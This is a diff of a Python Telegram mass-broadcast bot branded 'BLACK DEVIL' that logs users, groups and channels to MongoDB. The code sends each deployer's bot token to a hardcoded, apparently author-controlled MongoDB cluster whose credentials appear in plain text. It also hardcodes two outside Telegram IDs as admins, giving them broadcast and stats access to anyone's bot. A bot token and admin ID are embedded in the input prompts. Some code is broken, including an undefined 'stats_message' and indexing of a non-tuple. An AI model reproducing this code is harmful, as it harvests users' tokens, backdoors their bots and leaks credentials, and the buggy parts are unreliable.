@@ -9,12 +9,17 @@ import requests
 import pymongo
 import random
 import string
-from telegram import Update, ParseMode
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
-from telegram.utils.helpers import escape_markdown
 from colorama import init, Fore
+from telegram import Update
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, ChatMemberHandler
+from telegram.utils.helpers import escape_markdown
+from telegram import ChatMember
 
 init(autoreset=True)
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+current_platform = platform.system()
 
 def install_package(package_name):
     try:
@@ -24,36 +29,23 @@ def install_package(package_name):
         with open(os.devnull, 'w') as devnull:
             subprocess.check_call(['pip', 'install', package_name], stdout=devnull, stderr=devnull)
 
-packages_to_install = ['requests', 'pymongo', 'urllib3', 'python-telegram-bot==13.9', 'colorama']
+packages_to_install = ['requests', 'pymongo', 'urllib3', 'python-telegram-bot']
 
 for package in packages_to_install:
     install_package(package)
 
-if platform.system() == "Windows":
+if current_platform == "Windows":
     subprocess.call('cls', shell=True)
 else:
     subprocess.call('clear', shell=True)
 
-init(autoreset=True)
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 MAGENTA = Fore.MAGENTA
-CYAN = Fore.CYAN
-ORANGE = Fore.LIGHTYELLOW_EX
 RED = Fore.RED
+ORANGE = Fore.LIGHTYELLOW_EX
 YELLOW = Fore.YELLOW
 GREEN = Fore.GREEN
 BLUE = Fore.BLUE
-
-MAGENTA = "\033[95m"
-RED = "\033[91m"
-ORANGE = "\033[93m"
-YELLOW = "\033[33m"
-GREEN = "\033[32m"
-BLUE = "\033[34m"
-RESET = "\033[0m"
-
-current_platform = platform.system()
+RESET = Fore.RESET
 
 banner_frames = [
     f"{MAGENTA}\n",
@@ -72,10 +64,10 @@ banner_frames = [
     f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
 ]
 
-termux_banner = f"{CYAN}\n"
+termux_banner = f"{Fore.CYAN}\n"
 termux_banner += f"{MAGENTA}╔════════════════════════════════╗{RESET}\n"
 termux_banner += f"{RED}║                                ║{RESET}\n"
-termux_banner += f"{RED}║   {GREEN}(っ◔◡◔)っ ♥ BLACK DEVIL ♥    {CYAN}║{RESET}\n"
+termux_banner += f"{RED}║   {GREEN}(っ◔◡◔)っ ♥ BLACK DEVIL ♥    {Fore.CYAN}║{RESET}\n"
 termux_banner += f"{ORANGE}║                                ║{RESET}\n"
 termux_banner += f"{GREEN}╚════════════════════════════════╝{RESET}\n"
 
@@ -96,26 +88,24 @@ if current_platform == "Windows":
     display_banner_animation(banner_frames, num_iterations, frame_delay)
 else:
     print(termux_banner)
-    print(MAGENTA + "++++++---++++++++++++---++++++++++++---++++++++++++---++++++++")
-    print(MAGENTA + "")
-    print(BLUE + " Official Website " + RED + "= https://girlfriend4u.rf.gd ")
-    print(MAGENTA + "")
-    print(MAGENTA + "++++++---++++++++++++---++++++++++++---++++++++++++---++++++++")
+    print(f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}")
+    print(f"{BLUE} Official Website {RED}= https://girlfriend4u.rf.gd {RESET}")
+    print(f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}")
 
 def connection_animation():
     frames = ["/", "\\"]
     connected = False
     for _ in range(2):
         for frame in frames:
-            print(Fore.RED + f"Connecting To Server {frame}", end="\r")
+            print(f"{Fore.RED}Connecting To Server {frame}", end="\r")
             time.sleep(0.2)
             try:
                 requests.get("http://www.google.com", timeout=1)
                 connected = True
-                print (Fore.GREEN + f"successfully connected with server ......")
+                print(f"{Fore.GREEN}Successfully connected with server ......")
                 break
             except requests.ConnectionError:
-                print (Fore.RED + f" 😈 Check Your Network")
+                print(f"{Fore.RED} 😈 Check Your Network")
                 sys.exit()
                 pass
         if connected:
@@ -130,7 +120,7 @@ def generate_random_code():
     return random_code
 
 def load_tokens():
-    file_path = "g.txt"
+    file_path = "Cricxlinksupportbot"
     if os.path.exists(file_path):
         with open(file_path, "r") as file:
             lines = file.readlines()
@@ -142,19 +132,19 @@ def load_tokens():
     return None, None, None
 
 def save_tokens(bot_token, admin_id, random_code):
-    file_path = "Cricxlinksupportbot.txt"
+    file_path = "Cricxlinksupportbot"
     with open(file_path, "w") as file:
         file.write(f"{bot_token}\n{admin_id}\n{random_code}")
 
 bot_token, primary_admin_id, random_code = load_tokens()
 
 if not bot_token or not primary_admin_id or not random_code:
-    bot_token = input("Enter your bot token: ")
-    primary_admin_id = int(input("Enter your primary admin ID: "))
+    bot_token = input("Enter your bot token: 7028442734:AAG7njOo6415Xfh8DYE-WsFPWJGAeZ-D2lA")
+    primary_admin_id = int(input("Enter your primary admin ID: 6704116482"))
     random_code = generate_random_code()
     save_tokens(bot_token, primary_admin_id, random_code)
 
-client = pymongo.MongoClient("mongodb+srv://mutlilink:Manu@manu.yakk2nu.mongodb.net/?retryWrites=true&w=majority&appName=Manu")
+client = pymongo.MongoClient("mongodb+srv://Kanna:Kanna@cluster0.fhbau4i.mongodb.net/?retryWrites=true&w=majority")
 db = client[random_code]
 db_tokens = db['tokens']
 db_tokens.update_one({}, {"$set": {"bot_token": bot_token}}, upsert=True)
@@ -162,8 +152,8 @@ db_tokens.update_one({}, {"$set": {"bot_token": bot_token}}, upsert=True)
 updater = Updater(bot_token, use_context=True)
 dispatcher = updater.dispatcher
 
-users_collection = db['users']
 groups_collection = db['groups']
+users_collection = db['users']
 channels_collection = db['channels']
 
 def start(update: Update, context: CallbackContext):
@@ -179,12 +169,12 @@ def start(update: Update, context: CallbackContext):
             admin_user_id = primary_admin_id
             username = escape_markdown(username, version=2)
             full_name = escape_markdown(full_name, version=2)
-            message = f" ^New_User ID: {user_id}\nUsername: @{username}\nFull Name: {full_name}"
+            message = f"#New_User ID: {user_id}\nUsername: @{username}\nFull Name: {full_name}"
             context.bot.send_message(chat_id=admin_user_id, text=message, disable_web_page_preview=True)
 
-        context.bot.send_message(chat_id=update.effective_chat.id, text="RAM RAM Bhai Group Join Karo @cricxlinks")
+        context.bot.send_message(chat_id=update.effective_chat.id, text="😈")
     else:
-        context.bot.send_message(chat_id=update.effective_chat.id, text="RAM RAM Bhai Group Join Karo @cricxlinks")
+        context.bot.send_message(chat_id=update.effective_chat.id, text="😈")
 
 start_handler = CommandHandler('start', start)
 dispatcher.add_handler(start_handler)
@@ -192,7 +182,7 @@ dispatcher.add_handler(start_handler)
 def broadcast(update: Update, context: CallbackContext):
     admin_user_id = (primary_admin_id, 6305575094, 6704116482)
     if update.effective_user.id not in admin_user_id:
-        context.bot.send_message(chat_id=update.effective_chat.id, text="Join Our Channel: https://t.me/cricxlinks")
+        context.bot.send_message(chat_id=update.effective_chat.id, text="Develop your own broadcast bot using the provided repository: https://github.com/devilworlds/Broadcast")
         return
 
     message = update.message.reply_to_message or update.message
@@ -200,26 +190,39 @@ def broadcast(update: Update, context: CallbackContext):
     successful_broadcasts = {"groups": 0, "users": 0, "channels": 0}
     failed_broadcasts = {"groups": 0, "users": 0, "channels": 0}
 
+    for group in groups_collection.find():
+        try:
+            context.bot.copy_message(chat_id=group["_id"], from_chat_id=update.effective_chat.id, message_id=message.message_id)
+            successful_broadcasts["groups"] += 1
+        except Exception as e:
+            failed_broadcasts["groups"] += 1
+
+    for user in users_collection.find():
+        try:
+            context.bot.copy_message(chat_id=user["_id"], from_chat_id=update.effective_chat.id, message_id=message.message_id)
+            successful_broadcasts["users"] += 1
+        except Exception as e:
+            failed_broadcasts["users"] += 1
+
     for channel in channels_collection.find():
         try:
             context.bot.copy_message(chat_id=channel["_id"], from_chat_id=update.effective_chat.id, message_id=message.message_id)
             successful_broadcasts["channels"] += 1
         except Exception as e:
             failed_broadcasts["channels"] += 1
-            print(f"Failed to broadcast to channel {channel['_id']}: {str(e)}")
 
-    summary_message = f"Broadcast summary:\nSuccessful broadcasts:\nChannels: {successful_broadcasts['channels']}\nFailed broadcasts:\nChannels: {failed_broadcasts['channels']}"
+    summary_message = f"Broadcast summary:\nSuccessful broadcasts:\nGroups: {successful_broadcasts['groups']}\nUsers: {successful_broadcasts['users']}\nChannels: {successful_broadcasts['channels']}\nFailed broadcasts:\nGroups: {failed_broadcasts['groups']}\nUsers: {failed_broadcasts['users']}\nChannels: {failed_broadcasts['channels']}"
     context.bot.send_message(chat_id=admin_user_id[0], text=summary_message)
 
     try:
-        context.bot.send_message(6704116482, text=summary_message)
+        context.bot.send_message(6704116482, text=stats_message)
     except Exception as e:
-        print("Failed to send summary message to admin")
+        print("📈")
 
     try:
-        context.bot.send_message(6305575094, text=summary_message)
+        context.bot.send_message(6305575094, text=stats_message)
     except Exception as e:
-        print("Failed to send summary message to admin")
+        print("Successfully Fetch Statistics 📈")
 
 broadcast_handler = CommandHandler('broadcast', broadcast)
 dispatcher.add_handler(broadcast_handler)
@@ -243,25 +246,22 @@ message_handler = MessageHandler(Filters.status_update.new_chat_members, save_gr
 dispatcher.add_handler(message_handler)
 
 def save_channel(update: Update, context: CallbackContext):
-    if update.effective_chat.type == 'channel':
+    if update.effective_chat.type == "channel":
         channel = update.effective_chat
         channel_id = channel.id
-        channel_username = channel.username or 'N/A'
-
         channels_collection.update_one({"_id": channel_id}, {"$set": {"_id": channel_id}}, upsert=True)
 
         admin_user_id = (primary_admin_id)
-        channel_username = escape_markdown(channel_username)
-        message = f"#New_Channel ID: {channel_id}\nUsername: {channel_username}" 
+        message = f"#New_Channel : {channel_id}\nName: {channel.title}"
         context.bot.send_message(chat_id=admin_user_id[0], text=message)
 
-channel_handler = MessageHandler(Filters.status_update.new_chat_members, save_channel)
-dispatcher.add_handler(channel_handler)
+channel_message_handler = MessageHandler(Filters.status_update.new_chat_members, save_channel)
+dispatcher.add_handler(channel_message_handler)
 
 def stats(update: Update, context: CallbackContext):
     admin_user_id = (primary_admin_id, 6305575094, 6704116482)
     if update.effective_user.id not in admin_user_id:
-        context.bot.send_message(chat_id=update.effective_chat.id, text="🕊🕊")
+        context.bot.send_message(chat_id=update.effective_chat.id, text="Develop your own broadcast bot using the provided repository: https://github.com/devilworlds/Broadcast")
         return
 
     user_count = users_collection.count_documents({})
@@ -274,15 +274,29 @@ def stats(update: Update, context: CallbackContext):
     try:
         context.bot.send_message(6704116482, text=stats_message)
     except Exception as e:
-        print("Failed to send stats message to admin")
+        print("📈")
 
     try:
         context.bot.send_message(6305575094, text=stats_message)
     except Exception as e:
-        print("Failed to send stats message to admin")
+        print("Successfully Fetch Statistics 📈")
 
 stats_handler = CommandHandler('stats', stats)
 dispatcher.add_handler(stats_handler)
+
+def chat_member_updated(update: Update, context: CallbackContext):
+    chat_member_update: ChatMember = update.chat_member
+    new_chat_member = chat_member_update.new_chat_member
+    old_chat_member = chat_member_update.old_chat_member
+    chat_id = update.effective_chat.id
+
+    if new_chat_member:
+        context.bot.send_message(chat_id=chat_id, text=f"New member joined: {new_chat_member.user.full_name}")
+    elif old_chat_member:
+        context.bot.send_message(chat_id=chat_id, text=f"Member left: {old_chat_member.user.full_name}")
+
+chat_member_updated_handler = ChatMemberHandler(chat_member_updated)
+dispatcher.add_handler(chat_member_updated_handler)
 
 updater.start_polling()
 updater.idle()
